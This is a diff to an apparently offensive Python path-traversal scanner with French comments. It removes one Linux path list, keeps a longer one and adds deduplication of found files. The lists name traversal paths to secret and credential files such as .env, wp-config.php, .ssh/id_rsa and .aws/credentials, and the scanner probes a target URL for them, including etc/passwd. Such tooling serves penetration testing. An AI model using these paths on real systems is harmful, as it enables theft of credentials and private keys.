@@ -2950,41 +2950,7 @@ COMMON_PATHS_windows = [
     "../../../../../../windows/system32/inetsrv/config/applicationHost.config"  # Config globale IIS
 ]
 
-
 COMMON_PATHS_linux = [
-    # Fichiers config
-    "../.env", "../../.env",
-    "../config.php", "../../config.php",
-    "../settings.php", "../../settings.php",
-    "../wp-config.php", "../../wp-config.php",
-    "../configuration.php", "../../configuration.php",
-    "../env.php", "../../env.php",
-
-    # Logs
-    "../error.log", "../../error.log",
-    "../debug.log", "../../debug.log",
-    "../laravel.log", "../../laravel.log",
-
-    # Backups
-    "../backup.zip", "../../backup.zip",
-    "../config.php.bak", "../../config.php.bak",
-    "../wp-config.php.old", "../../wp-config.php.old",
-
-    # Credentials
-    "../.git/config", "../../.git/config",
-    "../.ssh/id_rsa", "../../.ssh/id_rsa",
-    "../.aws/credentials", "../../.aws/credentials",
-
-    # CMS
-    "../wp-content/debug.log", "../../wp-content/debug.log",
-    "../sites/default/settings.php", "../../sites/default/settings.php",
-    "../storage/logs/laravel.log", "../../storage/logs/laravel.log",
-
-    # Temp
-    "../debug.php", "../../debug.php"
-]
-
-COMMON_PATHS_linux1 = [
     # ==============================
     # 1. FICHIERS SYSTÈME CRITIQUES
     # ==============================
@@ -3142,7 +3108,6 @@ COMMON_PATHS_linux1 = [
     "../debug.php", "../../debug.php"
     
 ]
-
 
 path_to_home = [
     # ===============================
@@ -3339,7 +3304,10 @@ def check_traversal_paths(BASE_URL, method, cookies, max_threads):
     print(f"{C}[*] Getting baseline response (non-existent file) ...")
     baseline_url = BASE_URL + NON_EXISTENT_PATH
     baseline = get_response_signature(baseline_url, cookies)
-
+    
+    seen_paths_home = set()
+    seen_paths_generic = set()
+    
     if not baseline:
         print(f"{R}[!] Unable to get baseline response, stopping.")
         return
@@ -3412,7 +3380,8 @@ def check_traversal_paths(BASE_URL, method, cookies, max_threads):
 
                 for future in as_completed(futures):
                     res = future.result()
-                    if res:
+                    if res and res["path"] not in seen_paths_home:
+                        seen_paths_home.add(res["path"])
                         found_files1.append(res)
 
             print(f"{G}\n--- etc/passwd ---")
@@ -3438,6 +3407,7 @@ def check_traversal_paths(BASE_URL, method, cookies, max_threads):
         print("")
     else:
         print(f"{R}[!] No files were found matching known traversal paths.\n")
+
 
     # ===============================
     # 2. PATHS GÉNÉRIQUES / CONNUS
@@ -3476,7 +3446,8 @@ def check_traversal_paths(BASE_URL, method, cookies, max_threads):
 
         for future in as_completed(futures):
             res = future.result()
-            if res:
+            if res and res["path"] not in seen_paths_generic:
+                seen_paths_generic.add(res["path"])
                 found_files.append(res)
 
     # ===== Affichage final =====
